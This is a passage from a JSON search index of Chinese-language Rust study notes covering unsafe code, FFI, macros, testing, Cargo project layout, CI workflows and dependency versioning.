\u5b9a\u4e49 \u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u53ea\u80fd\u5728 unsafe \u5757\u4e2d\u8c03\u7528\uff0c\u5373\u8981\u786e\u4fdd\u8ba4\u8bc6\u5230\u4e86\u6b63\u5728\u8c03\u7528\u7684\u662f\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u51fd\u6570 \u5305\u542b unsafe \u5757\u7684\u51fd\u6570\u4e0d\u5fc5\u90fd\u6807\u8bb0\u4e3a unsafe \u51fd\u6570\uff0c\u56e0\u4e3a\u6709\u4e9b\u51fd\u6570\u867d\u7136\u7528\u4e86 unsafe\uff0c\u4f46\u64cd\u4f5c\u5b9e\u9645\u4e0a\u662f\u5b8c\u5168\u5b89\u5168\u7684\uff08\u7f16\u8bd1\u5668\u4fdd\u5b88\u8ba4\u4e3a\u5176\u4e0d\u5b89\u5168\uff09","title":"unsafe \u51fd\u6570"},{"location":"cs/pl/rust/basic/#ffi","text":"\u5373 Foreign Function Interface\uff0c\u7528\u6765\u548c\u5176\u4ed6\u8bed\u8a00\u8fdb\u884c\u4ea4\u4e92 rust \u8c03\u7528 c \u9700\u8981\u5728 rust \u4ee3\u7801\u4e2d\u5199\u660e\u8981\u8c03\u7528\u7684\u51fd\u6570\u7b7e\u540d \u8c03\u7528\u5fc5\u987b\u5728 unsafe \u5757\u4e2d\u8fdb\u884c \u4f8b\u5982\u8c03\u7528 C \u6807\u51c6\u5e93\u4e2d\u7684 abs \u51fd\u6570 extern \"C\" { fn abs ( input : i32 ) -> i32 ; } fn main () { unsafe { println! ( \"abs(-1) = {}\" , abs ( - 1 )); } } c \u8c03\u7528 rust #[no_mangle] pub extern \"C\" fn call_from_c () { println! ( \"Call from C\" ); } \u4f7f\u7528 extern \u521b\u5efa\u4e00\u4e2a\u63a5\u53e3 #[no_mangle] \u544a\u8bc9\u7f16\u8bd1\u5668\u4e0d\u8981\u4fee\u9970\u51fd\u6570\u540d \u5b9e\u7528\u5de5\u5177 \u81ea\u52a8\u751f\u6210 FFI \u63a5\u53e3 \u751f\u6210 rust \u8c03\u7528 c \u7684\u4ee3\u7801\uff1a rust-lang/rust-bindgen \u4ece rust \u4ee3\u7801\u751f\u6210 c bindings\uff1a eqrion/cbindgen \u4e0e C++ \u4ee3\u7801\u4ea4\u4e92\uff08\u662f\u5b89\u5168\u7684\uff09\uff1a dtolnay/cxx","title":"FFI"},{"location":"cs/pl/rust/basic/#unsafe-trait","text":"\u81f3\u5c11\u6709\u4e00\u4e2a\u65b9\u6cd5\u5305\u542b\u7f16\u8bd1\u5668\u65e0\u6cd5\u9a8c\u8bc1\u7684\u5185\u5bb9\u7684 trait \u4f1a\u88ab\u6807\u4e3a unsafe \u5b9a\u4e49\u4f7f\u7528 unsafe trait \u5b9a\u4e49 \u5b9e\u73b0\u65b9\u6cd5\u4f7f\u7528 unsafe impl","title":"\u5b9e\u73b0 unsafe trait"},{"location":"cs/pl/rust/basic/#union","text":"\u7c7b\u4f3c\u7ed3\u6784\u4f53\uff0c\u4f46\u6240\u6709\u5b57\u6bb5\u5171\u7528\u540c\u4e00\u4e2a\u5b58\u50a8\u7a7a\u95f4\uff0c\u5373\u5411\u4e00\u4e2a\u5b57\u6bb5\u4e2d\u5199\u5165\u503c\u56de\u8986\u76d6\u5176\u5b83\u5b57\u6bb5 #[repr(C)] union MyUnion { f1 : u32 , f2 : f32 , } \u8bbf\u95ee union \u5b57\u6bb5\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u56e0\u4e3a rust \u65e0\u6cd5\u4fdd\u8bc1\u5f53\u524d\u5b58\u50a8\u5728 union \u5b9e\u4f8b\u4e2d\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4f46\u5199\u5165\u662f\u5b89\u5168\u7684","title":"\u8bbf\u95ee union \u4e2d\u5b57\u6bb5"},{"location":"cs/pl/rust/basic/#macro","text":"","title":"macro \u5b8f\u7f16\u7a0b"},{"location":"cs/pl/rust/basic/#_67","text":"\u4f7f\u7528 macro_rules! \u8fdb\u884c\u5b9a\u4e49\uff0c\u5339\u914d\u4ee3\u7801\u5e76\u751f\u6210\u4ee3\u7801 #[macro_export] macro_rules! myvec { ( $( $x : expr ), * ) => { { let mut tmp_vec = Vec :: new (); $( tmp_vec . push ( $x ); ) * tmp_vec } }; } \u5b8f\u540d\u79f0\u4e0d\u5fc5\u52a0 !\uff0c\u4f46\u8c03\u7528\u65f6\u9700\u8981\u52a0 #[macro_export] \u7528\u4e8e\u5bfc\u51fa\u5b8f\uff0c\u8ba9\u5176\u5b83\u5305\u53ef\u4ee5\u5f15\u5165\u4f7f\u7528 \u8fdb\u884c\u8f93\u5165\u4ee3\u7801\u7684\u6a21\u5f0f\u5339\u914d\uff0c\u4f7f\u7528 ( $( $x : expr ), * ) \u5339\u914d\u591a\u4e2a\u4ee5 , \u5206\u9694\u7684\u8868\u8fbe\u5f0f\uff0c\u6bcf\u4e2a\u8bb0\u4e3a $x \u4f9b\u540e\u9762\u4ee3\u7801\u4e2d\u4f7f\u7528\uff0c* \u4ee3\u8868\u524d\u9762\u7684\u6a21\u5f0f\u53ef\u4ee5\u51fa\u73b0\u4efb\u610f\u6b21\uff08\u5305\u62ec 0\uff09 => \u540e\u9762\u662f\u8981\u751f\u6210\u7684\u76ee\u6807\u4ee3\u7801 \u53ef\u4ee5\u4f7f\u7528 myvec ! [ 1 , 2 , 3 ] \u521b\u5efa Vec\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 myvec ! ( .. .) \u6216 myvec ! { .. .} \uff0c\u8fd9\u4e09\u8005\u7b49\u4ef7 \u8be6\u7ec6\u7528\u6cd5 TODO\uff1a https://veykril.github.io/tlborm/","title":"\u58f0\u660e\u5f0f\u5b8f"},{"location":"cs/pl/rust/basic/#_68","text":"\u8fc7\u7a0b\u5b8f\u7684\u5b9a\u4e49\u5fc5\u987b\u653e\u5165\u72ec\u7acb\u7684 lib crate \u4e2d \u81ea\u5b9a\u4e49 derive \u8fc7\u7a0b\u5b8f \u5728\u5f53\u524d crate \u6839\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 lib crate \u7528\u4e8e\u7f16\u5199\u5b8f \u65b0\u7684 Cargo.toml \u4e2d\u9700\u8981\u6dfb\u52a0 [lib] proc-macro = true [dependencies] syn = \"1.0\" quote = \"1.0\" lib.rs extern crate proc_macro ; use proc_macro :: TokenStream ; use quote :: quote ; use syn ; #[proc_macro_derive(HelloMacro)] pub fn hello_macro_derive ( input : TokenStream ) -> TokenStream { // \u57fa\u4e8e input \u6784\u5efa AST \u8bed\u6cd5\u6811 let ast = syn :: parse ( input ). unwrap (); // \u6784\u5efa\u7279\u5f81\u5b9e\u73b0\u4ee3\u7801 impl_hello_macro ( & ast ) } impl_hello_macro \u51fd\u6570 fn impl_hello_macro ( ast : & syn :: DeriveInput ) -> TokenStream { let name = & ast . ident ; let gen = quote ! { impl HelloMacro for # name { fn hello_macro () { println! ( \"Hello, Macro! My name is {}!\" , stringify! ( # name )); } } }; gen . into () } \u8bfb\u53d6 ast\uff0c\u4f7f\u7528 quote \u751f\u6210\u4ee3\u7801\uff0c\u7136\u540e\u8c03\u7528 .into \u8f6c\u6362\u6210 TokenStream \u5bfc\u5165\u8fd9\u4e2a crate \u4e4b\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 #[derive(HelloMacro)] \u751f\u6210\u4ee3\u7801\u81ea\u52a8\u5b9e\u73b0 HelloMacro \u4e86 \u7c7b\u5c5e\u6027\u5b8f\uff08attribute-like macros\uff09 \u4f8b\u5982\u4fee\u9970\u4e00\u4e2a\u51fd\u6570\uff1a #[route(GET, \"/\" )] fn index () { .. . } \u4e5f\u9700\u8981\u4e00\u4e2a\u72ec\u7acb\u7684 crate \u6765\u5b9a\u4e49\uff0c\u5b9a\u4e49\u51fd\u6570\uff1a #[proc_macro_attribute] pub fn route ( attr : TokenStream , item : TokenStream ) -> TokenStream { .. . } attr \u662f\u5c5e\u6027\u5305\u542b\u7684\u5185\u5bb9\uff0c\u5982\u4e0a\u4f8b\u5b50\u4e2d\u7684 GET, \"/\" item \u662f\u6807\u6ce8\u7684\u9879\uff0c\u5982\u4e0a\u4f8b\u5b50\u4e2d\u7684 fn index() { ... } \u5373\u6574\u4e2a\u51fd\u6570\u4f53 \u7c7b\u51fd\u6570\u5b8f \u548c\u58f0\u660e\u5b8f\u7684\u4f7f\u7528\u65b9\u5f0f\u7c7b\u4f3c\uff0c\u4f46\u548c\u524d\u4e24\u79cd\u8fc7\u7a0b\u5b8f\u7684\u5b9a\u4e49\u65b9\u5f0f\u7c7b\u4f3c \u4f8b\u5982\u5982\u4e0b\u8c03\u7528\u89e3\u6790 SQL \u8bed\u53e5\uff1a let sql = sql ! ( SELECT * FROM posts WHERE id = 1 ); \u9700\u8981\u5bf9 SQL \u8bed\u53e5\u8fdb\u884c\u89e3\u6790\uff0cmacro_rules \u96be\u4ee5\u5b9e\u73b0 \u7c7b\u51fd\u6570\u5b8f\u5b9a\u4e49\u5f62\u5f0f\uff1a #[proc_macro] pub fn sql ( input : TokenStream ) -> TokenStream { .. . } TODO \u8fc7\u7a0b\u5b8f\uff1a https://github.com/dtolnay/proc-macro-workshop \u3001 https://blog.turbo.fish/ \u58f0\u660e\u5b8f\uff1a https://veykril.github.io/tlborm/ \u3001 https://zjp-cn.github.io/tlborm/","title":"\u8fc7\u7a0b\u5b8f"},{"location":"cs/pl/rust/basic/#_69","text":"","title":"\u6d4b\u8bd5"},{"location":"cs/pl/rust/basic/#_70","text":"assert_eq! \u5b8f\u7528\u4e8e\u5224\u65ad\u4e24\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u662f\u5426\u76f8\u7b49 \u4e0d\u76f8\u7b49\u5f53\u524d\u7ebf\u7a0b\u4f1a\u76f4\u63a5 panic \u53ef\u4ee5\u4ece\u7b2c\u4e09\u4e2a\u53c2\u6570\u5f00\u59cb\u8865\u5145\u683c\u5f0f\u5316\u8f93\u51fa\u989d\u5916\u4fe1\u606f assert_eq! ( a , b , \"\u989d\u5916\u4fe1\u606f\uff1aa = {}...\" , a ); assert_ne! \u5b8f\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u76f8\u7b49\u4f1a panic assert! \u5b8f\u7528\u4e8e\u5224\u65ad\u4f20\u5165\u7684\u5e03\u5c14\u8868\u8fbe\u5f0f\u662f\u5426\u4e3a true\uff0c\u4e3a false \u7684\u8bdd\u4f1a panic debug_assert_eq! debug_assert_ne! debug_assert! \u5b8f\u7528\u6cd5\u76f8\u540c\uff0c\u4f46\u662f\u53ea\u4f1a\u5728 Debug \u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u4f8b\u5982 cargo run --release \u5c31\u4e0d\u4f1a\u6267\u884c\u8fd9\u4e9b\u65ad\u8a00","title":"\u65ad\u8a00"},{"location":"cs/pl/rust/basic/#_71","text":"rust \u53ea\u4f1a\u80fd lib crate \u8fdb\u884c\u6d4b\u8bd5\uff0c\u800c\u65e0\u6cd5\u5bf9 bin crate \u6d4b\u8bd5 \u5355\u5143\u6d4b\u8bd5 \u5b9a\u4e49\u4e00\u4e2a mod \u5e76\u6807\u8bb0\u4e3a test\uff1a #[cfg(test)] mod tests { #[test] fn test1 () { assert_eq! ( 2 + 2 , 4 ); } } panic \u4e86\u5219\u4e0d\u901a\u8fc7 \u5bf9\u4e8e\u6d4b\u8bd5\u51fd\u6570\u6dfb\u52a0\u4e00\u4e2a #[should_panic] \u53ef\u4ee5\u6807\u8bb0 panic \u4e3a\u671f\u671b\u7ed3\u679c\uff0c\u4e0d panic \u5219\u4e0d\u901a\u8fc7 \u53ef\u4ee5\u4f7f\u7528 expected \u53c2\u6570\u6765\u8868\u793a\u671f\u671b\u5f97\u5230\u7684 panic \u5b57\u7b26\u4e32 #[test] #[should_panic(expected= \"...\" )] fn test2 () { .. . } \u53ef\u4ee5\u4f7f\u7528 Result \u4f5c\u4e3a\u8fd4\u56de\u503c\uff0c\u8fd4\u56de Err \u5219\u4e0d\u901a\u8fc7\uff0c\u53ef\u4ee5\u8fd9\u6837\u6765\u5b9e\u73b0\u6d4b\u8bd5\u7684\u94fe\u5f0f\u8c03\u7528\uff0c\u4f46 #[should_panic] \u5728\u6b64\u65f6\u5c06\u4e0d\u53ef\u7528 \u4f7f\u7528 #[ignore] \u6765\u5ffd\u7565\u5f53\u524d\u6d4b\u8bd5 cargo test \u65f6\u4f20\u5165 --ignored \u53ef\u4ee5\u6267\u884c\u5ffd\u7565\u7684\u6d4b\u8bd5 \u96c6\u6210\u6d4b\u8bd5 tests \u76ee\u5f55\u7528\u6765\u4e13\u95e8\u5b58\u653e\u96c6\u6210\u6d4b\u8bd5\uff0ccargo \u4f1a\u4ece\u4e2d\u5bfb\u627e\u6d4b\u8bd5\u6587\u4ef6\uff0c\u5728\u6d4b\u8bd5\u65f6\u90fd\u4f1a\u8fd0\u884c \u6bcf\u4e2a\u6587\u4ef6\u5185\u90e8\u4e0d\u9700\u8981 #[cfg(test)] \u4ee5\u53ca\u4e0d\u9700\u8981\u521b\u5efa mod cargo test --test name \u6765\u4ec5\u6d4b\u8bd5 tests/name.rs \u6587\u4ef6 tests \u76ee\u5f55\u4e0b\u7684\u5b50\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u4e0d\u4f1a\u88ab\u5f53\u4f5c\u72ec\u7acb\u7684\u5305\u4e5f\u4e0d\u4f1a\u6709\u6d4b\u8bd5\u8f93\u51fa\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b50\u76ee\u5f55\u521b\u5efa\u6a21\u5757\u6765\u5b58\u653e\u6d4b\u8bd5\u65f6\u4f1a\u4f7f\u7528\u4f46\u4e0d\u5e0c\u671b\u88ab\u6d4b\u8bd5\u7684\u4ee3\u7801 cargo test cargo test \u6267\u884c\u6240\u6709\u6d4b\u8bd5 \u5355\u5143\u6d4b\u8bd5\u3001\u96c6\u6210\u6d4b\u8bd5\u3001\u6587\u6863\u6d4b\u8bd5 \u4f7f\u7528 -- \u9644\u52a0\u53c2\u6570 -- \u540e\u52a0 --test-threads=... \u6765\u6307\u5b9a\u8fdb\u884c\u6d4b\u8bd5\u7684\u7ebf\u7a0b\u6570 -- \u540e\u52a0 --show-output \u6765\u8f93\u51fa\u6807\u51c6\u8f93\u51fa\u4e2d\u5185\u5bb9 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6d4b\u8bd5\u65f6\u5982\u679c\u901a\u8fc7\u5219\u6807\u51c6\u8f93\u51fa\u7684\u5185\u5bb9\u4e0d\u4f1a\u663e\u793a\u51fa\u6765 -- \u540e\u52a0 --ignored \u6765\u4ec5\u8fd0\u884c\u5ffd\u7565\u7684\u6d4b\u8bd5 -- \u540e\u52a0 --no-run \u4ec5\u7f16\u8bd1\u51fa\u6d4b\u8bd5\u4e8c\u8fdb\u5236\u6587\u4ef6\u800c\u4e0d\u8fd0\u884c \u8fd0\u884c\u90e8\u5206\u6d4b\u8bd5 cargo test name \u6765\u8fd0\u884c\u51fd\u6570\u540d\u91cc\u5305\u542b name \u7684\u6d4b\u8bd5\u51fd\u6570 \u6a21\u5757\u540d\u4e5f\u5305\u542b\u5728\u5176\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f9d\u6b64\u5206\u6a21\u5757\u8fdb\u884c\u6d4b\u8bd5 Cargo.toml \u4e2d\u52a0\u5165 [dev-dependencies] \u6307\u5b9a\u4ec5\u5728 test \u65f6\u4f1a\u7528\u5230\u7684\u4f9d\u8d56 cargo test \u65f6\u4f1a\u751f\u6210\u53ef\u8fd0\u884c\u6d4b\u8bd5\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4fdd\u5b58\u5728 target/debug/deps/ \u4e2d \u57fa\u51c6\u6d4b\u8bd5 benchmark \u5b98\u65b9 benchmark \u53ea\u80fd\u5728\u975e stable \u7248\u672c\u4e0b\u4f7f\u7528\uff0c\u9700\u8981\u5f15\u5165\u7279\u6027 #![feature(test)] \u548c test \u4e00\u6837\u5199\u5728 #[cfg(test)] \u4e2d\uff0c\u4f46\u4e0d\u6807\u8bb0\u4e3a #[test] \u800c\u662f #[bench] #[bench] fn bench_test ( b : & mut Bencher ) { b . iter ( || .. .); } \u521d\u59cb\u5316\u4ee3\u7801\u8981\u5199\u5728 iter \u4e4b\u5916\uff0c\u5426\u5219\u4f1a\u591a\u6b21\u5faa\u73af cargo test \u4f1a\u6267\u884c benchmark \u90e8\u5206\u4f46\u4e0d\u4f1a\u6709\u6027\u80fd\u6d4b\u8bd5\u7684\u8f93\u51fa\u7ed3\u679c \u901a\u8fc7 cargo bench \u6765\u6267\u884c benchmark \u4ee3\u7801\uff0c\u6b64\u65f6\u975e bench \u7684 test \u4f1a\u88ab ignore LLVM \u4f1a\u5c06\u6ca1\u6709\u526f\u4f5c\u7528\u7684\u51fd\u6570\u76f4\u63a5\u4f18\u5316\u5220\u6389\uff0c\u53ef\u4ee5\u4f7f\u7528 test::black_box \u6765\u5305\u88f9\u9632\u6b62\u88ab\u4f18\u5316\uff0c\u5982 b . iter ( || { test :: black_box ( func ( test :: black_box ( arg ))); }) \u4f7f\u7528 criterion.rs\uff08\u63a8\u8350\uff09 \u53ef\u4ee5\u6709\u66f4\u591a\u7684\u5206\u6790\u4fe1\u606f \u5b98\u65b9\u6587\u6863\uff1a https://bheisler.github.io/criterion.rs/book/getting_started.html","title":"\u7f16\u5199\u6d4b\u8bd5"},{"location":"cs/pl/rust/misc/","text":"Rust \u6742\u9879\u968f\u8bb0 \u00b6 Abstract \u770b\u5404\u79cd\u6587\u6863\u3001\u6559\u7a0b\u8bb0\u5f55\u7684\u96f6\u6563\u77e5\u8bc6\u70b9 \u8bed\u6cd5/\u7528\u6cd5\u8865\u5145 \u00b6 std::mem::size_of_val(&x) \u8fd4\u56de x \u5360\u7528\u7684\u7a7a\u95f4\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09 .to_string() \u65b9\u6cd5\u4f1a\u5229\u7528\u5f53\u524d\u7c7b\u578b\u4e0a Display trait \u7684 fmt \u8f93\u51fa\uff0c\u5c06\u5176\u8f6c\u4e3a String\uff08\u5b9e\u73b0\u4e86 Display \u5c31\u5b9e\u73b0\u4e86 ToString trait\uff09 .parse() \u4f1a\u5c1d\u8bd5\u89e3\u6790\u5b57\u7b26\u4e32\u5230\u5176\u5b83\u7c7b\u578b\uff0c\u5982\u679c\u90a3\u4e2a\u7c7b\u578b\u5b9e\u73b0\u4e86 FromStr trait \u5219\u53ef\u4ee5\u6b63\u5e38\u8f6c\u6362\u8fd4\u56de Ok(...) \u5426\u5219\u8fd4\u56de Err(...) \u5df2\u7ecf\u6807\u6ce8\u4e86\u7ed1\u5b9a\u53d8\u91cf\u7684\u7c7b\u578b\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 .parse() \u4e0d\u80fd\u63a8\u6d4b\u7c7b\u578b\u7684\u9700\u8981\u901a\u8fc7 .parse::< type >() \u8fdb\u884c\u8c03\u7528 ref \u53ef\u4ee5\u7528\u6765\u521b\u5efa\u5f15\u7528 let ref a = 1; \u76f8\u5f53\u4e8e let a = &1; match \u7684\u65f6\u5019\u53ef\u4ee5\u5728 pattern \u91cc\u901a\u8fc7 ref \u6765\u521b\u5efa\u5f15\u7528 let a = 1 ; match a { ref b => .. ., // b \u662f\u4e00\u4e2a\u5f15\u7528 } match a { ref mut b => .. ., // b \u662f\u4e00\u4e2a\u53ef\u53d8\u5f15\u7528 } \u8f93\u5165\u8f93\u51fa \u5229\u7528 Read trait \u7684\u65b9\u6cd5\u8fdb\u884c\u8bfb\u5165\uff0cstd: :stdin() \u5e26\u6709 Read trait\uff0c\u53ef\u4ee5\u5bf9\u5176\u8c03\u7528 read \u65b9\u6cd5 \u4e5f\u53ef\u4ee5\u8c03\u7528 std: :Stdin \u4e0a\u7684 read_line \u65b9\u6cd5 let mut line = String :: new (); let len_bytes = std :: io :: stdin (). read_line ( & mut line ). unwrap (); \u8f93\u51fa\u9664\u4e86\u901a\u8fc7 print \u4e4b\u5916\u8fd8\u53ef\u4ee5\u5229\u7528 Write trait \u7684\u65b9\u6cd5\uff0c\u5bf9 std: :stdout() \u8c03\u7528 .write \u65b9\u6cd5 \u6587\u4ef6\u8f93\u5165\u8f93\u51fa\u901a\u8fc7 std::fs::File::open \u6253\u5f00\u540e\u540c\u6837\u4f7f\u7528 Read \u548c Write \u7684\u65b9\u6cd5\u5373\u53ef Reference \u00b6 Rust By Example Rust docs Cargo \u00b6 \u5e38\u89c4\u9879\u76ee\u5e03\u5c40\uff1a . \u251c\u2500\u2500 Cargo.lock \u251c\u2500\u2500 Cargo.toml \u251c\u2500\u2500 src/ \u2502 \u251c\u2500\u2500 lib.rs \u2502 \u251c\u2500\u2500 main.rs \u2502 \u2514\u2500\u2500 bin/ \u2502 \u251c\u2500\u2500 named-executable.rs \u2502 \u251c\u2500\u2500 another-executable.rs \u2502 \u2514\u2500\u2500 multi-file-executable/ \u2502 \u251c\u2500\u2500 main.rs \u2502 \u2514\u2500\u2500 some_module.rs \u251c\u2500\u2500 benches/ \u2502 \u251c\u2500\u2500 large-input.rs \u2502 \u2514\u2500\u2500 multi-file-bench/ \u2502 \u251c\u2500\u2500 main.rs \u2502 \u2514\u2500\u2500 bench_module.rs \u251c\u2500\u2500 examples/ \u2502 \u251c\u2500\u2500 simple.rs \u2502 \u2514\u2500\u2500 multi-file-example/ \u2502 \u251c\u2500\u2500 main.rs \u2502 \u2514\u2500\u2500 ex_module.rs \u2514\u2500\u2500 tests/ \u251c\u2500\u2500 some-integration-tests.rs \u2514\u2500\u2500 multi-file-test/ \u251c\u2500\u2500 main.rs \u2514\u2500\u2500 test_module.rs Cargo.toml \u4e0e Cargo.lock Cargo.toml \u63cf\u8ff0\u4e86\u4f9d\u8d56\u7b49\u5143\u4fe1\u606f\uff0c\u662f\u624b\u52a8\u4fee\u6539\u7684 Cargo.lock \u662f cargo \u81ea\u52a8\u7ef4\u62a4\u7684\u5173\u4e8e\u4f9d\u8d56\u7684\u66f4\u591a\u66f4\u51c6\u786e\u7684\u4fe1\u606f\uff08\u6bd4\u5982\u901a\u8fc7 git \u4e0b\u8f7d\u7684\u5305\u4f1a\u9644\u5e26 sha \u503c\uff09\uff0c\u4e0d\u5e94\u8be5\u88ab\u624b\u52a8\u4fee\u6539 lib \u5305\u4e2d\u7684 Cargo.lock \u5e94\u8be5\u6dfb\u52a0\u5230 .gitignore \u4e2d\uff0c\u800c bin \u5305\u4e2d\u7684 Cargo.lock \u9700\u8981\u9644\u5e26\u4e0a\u4f20 \u5b9e\u7528 GitHub Action \u811a\u672c cargo book \u4e2d\u811a\u672c name : Cargo Build & Test on : push : pull_request : env : CARGO_TERM_COLOR : always jobs : build_and_test : name : Rust project - latest runs-on : ubuntu-latest strategy : matrix : toolchain : - stable - beta - nightly steps : - uses : actions/checkout@v3 - run : rustup update ${{ matrix.toolchain }} && rustup default ${{ matrix.toolchain }} - run : cargo build --verbose - run : cargo test --verbose course.rs \u4e2d\u6d4b\u8bd5\u811a\u672c on : [ push , pull_request ] name : Continuous integration jobs : check : name : Check runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions-rs/toolchain@v1 with : profile : minimal toolchain : stable override : true - run : cargo check test : name : Test Suite runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions-rs/toolchain@v1 with : profile : minimal toolchain : stable override : true - run : cargo test fmt : name : Rustfmt runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions-rs/toolchain@v1 with : profile : minimal toolchain : stable override : true - run : rustup component add rustfmt - run : cargo fmt --all -- --check clippy : name : Clippy runs-on : ubuntu-latest steps : - uses : actions/checkout@v2 - uses : actions-rs/toolchain@v1 with : profile : minimal toolchain : stable override : true - run : rustup component add clippy - run : cargo clippy -- -D warnings \u6307\u5b9a\u4f9d\u8d56 - \u9ed8\u8ba4\u4ece crates.io \u4e0a\u4e0b\u8f7d\uff0c\u53ea\u9700\u8981\u540d\u5b57\u548c\u7248\u672c\u53f7 - \u7248\u672c\u6307\u5b9a \u7248\u672c\u53f7\u4f7f\u7528 SemVer \u89c4\u8303\uff0c\u5373 major.minor.patch \u4e00\u4e2a\u7248\u672c\u53f7\u89c4\u5b9a\u7684\u662f\u4e00\u4e2a\u7248\u672c\u8303\u56f4 \u6700\u4f4e\u7248\u672c\u662f\u4e66\u5199\u51fa\u6765\u7684\u7248\u672c\uff0c\u6700\u9ad8\u7248\u672c\u4f1a\u4fdd\u8bc1\u6700\u5de6\u4fa7\u975e\u96f6\u7684\u7248\u672c\u53f7\u4e0d\u53d8\uff0c\u4f8b\uff1a 1.2.3 := >=1.2.3, <2.0.0 1.2 := >=1.2.0, <2.0.0 1 := >=1.0.0, <2.0.0 0.2.3 := >=0.2.3, <0.3.0 0.2 := >=0.2.0, <0.3.0 0.0.3 := >=0.0.3, <0.0.4 0.0 := >=0.0.0, <0.1.0 0 := >=0.0.0, <1.0.0 cargo update \u4e5f\u4f1a\u6309\u7167\u8fd9\u4e2a\u89c4\u8303\u66f4\u65b0\u5230\u5141\u8bb8\u7684\u6700\u9ad8\u7248\u672c\uff08\u5982 0.2.3 \u5982\u679c\u8981\u66f4\u65b0\u7684\u8bdd\uff0c\u4e14 0.2.5 \u662f\u6700\u65b0\u7684\u4ee5 0.2 \u5f00\u5934\u7684\u7248\u672c\uff0c\u5219\u53ea\u4f1a\u66f4\u65b0\u5230 0.2.5\uff09 \u6ce2\u6d6a\u53f7\uff1a ~1.2.3 := >=1.2.3, <1.3.0 ~1.2 := >=1.2.0, <1.3.0 ~1 := >=1.0.0, <2.0.0 \u901a\u914d\u7b26\uff1a * := >=0.0.0 1.* := >=1.0.0, <2.0.0 1.2.* := >=1.2.0, <1.3.0 \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5927\u4e8e\u7b49\u4e8e\u5c0f\u4e8e\u53f7\uff0c\u4ee5\u53ca\u9017\u53f7\u5206\u9694\u7684\u591a\u4e2a\u9650\u5b9a\u5199\u6cd5 \u66f4\u6362 registry some-crate = { version = \"1.0\" , registry = \"my-registry\" } \u901a\u8fc7 git \u83b7\u53d6 regex = { git = \"https://github.com/rust-lang/regex\" } regex = { git = \"https://github.com/rust-lang/regex\" , branch = \"next\" } \u4ece\u672c\u5730\u8def\u5f84\u83b7\u53d6\uff08\u76f8\u5bf9\u8def\u5f84\u76f8\u5bf9\u4e8e Cargo.toml\uff09 some-crate = { path = \"...\" } some-crate = { path = \"...\" , version = \"...\" } publish \u7684\u8bdd\u9700\u8981\u5148\u5c06 some-crate publish \u6307\u5b9a\u4e86 version \u7684\u8bdd publish \u7684\u65f6\u5019\u4f1a\u4f7f\u7528 crates.io \u4e0a\u7684\u8fd9\u4e2a\u7248\u672c\uff0c\u5176\u5b83\u65f6\u5019\u4f7f\u7528\u672c\u5730\u7248\u672c \u5206\u5e73\u53f0\uff1a [target.'cfg(windows)'.dependencies] inhttp = \"0.4.0\" [target.'cfg(unix)'.dependencies] penssl = \"1.0.1\" [target.'cfg(target_arch = \"x86\")'.dependencies] ative-i686 = { path = \"native/i686\" } [target.'cfg(target_arch = \"x86_64\")'.dependencies] ative-x86_64 = { path = \"native/x86_64\" } Reference \u00b6 The Cargo Book \u3001 \u4e2d\u6587\u7ffb\u8bd1\u7248 Cargo \u624b\u518c","title":"Rust \u6742\u9879\u968f\u8bb0"},{"location":"cs/pl/rust/misc/#rust","text":"Abstract \u770b\u5404\u79cd\u6587\u6863\u3001\u6559\u7a0b\u8bb0\u5f55\u7684\u96f6\u6563\u77e5\u8bc6\u70b9","title":"Rust \u6742\u9879\u968f\u8bb0"},{"location":"cs/pl/rust/misc/#_1","text":"std::mem::size_of_val(&x) \u8fd4\u56de x \u5360\u7528\u7684\u7a7a\u95f4\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09 .to_string() \u65b9\u6cd5\u4f1a\u5229\u7528\u5f53\u524d\u7c7b\u578b\u4e0a Display trait \u7684 fmt \u8f93\u51fa\uff0c\u5c06\u5176\u8f6c\u4e3a String\uff08\u5b9e\u73b0\u4e86 Display \u5c31\u5b9e\u73b0\u4e86 ToString trait\uff09 .parse() \u4f1a\u5c1d\u8bd5\u89e3\u6790\u5b57\u7b26\u4e32\u5230\u5176\u5b83\u7c7b\u578b\uff0c\u5982\u679c\u90a3\u4e2a\u7c7b\u578b\u5b9e\u73b0\u4e86 FromStr trait \u5219\u53ef\u4ee5\u6b63\u5e38\u8f6c\u6362\u8fd4\u56de Ok(...) \u5426\u5219\u8fd4\u56de Err(...) \u5df2\u7ecf\u6807\u6ce8\u4e86\u7ed1\u5b9a\u53d8\u91cf\u7684\u7c7b\u578b\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 .parse() \u4e0d\u80fd\u63a8\u6d4b\u7c7b\u578b\u7684\u9700\u8981\u901a\u8fc7 .parse::< type >() \u8fdb\u884c\u8c03\u7528 ref \u53ef\u4ee5\u7528\u6765\u521b\u5efa\u5f15\u7528 let ref a = 1; \u76f8\u5f53\u4e8e let a = &1; match \u7684\u65f6\u5019\u53ef\u4ee5\u5728 pattern \u91cc\u901a\u8fc7 ref \u6765\u521b\u5efa\u5f15\u7528 let a = 1 ; match a { ref b => .. ., // b \u662f\u4e00\u4e2a\u5f15\u7528 } match a { ref mut b => .. ., // b \u662f\u4e00\u4e2a\u53ef\u53d8\u5f15\u7528 } \u8f93\u5165\u8f93\u51fa \u5229\u7528 Read trait \u7684\u65b9\u6cd5\u8fdb\u884c\u8bfb\u5165\uff0cstd: 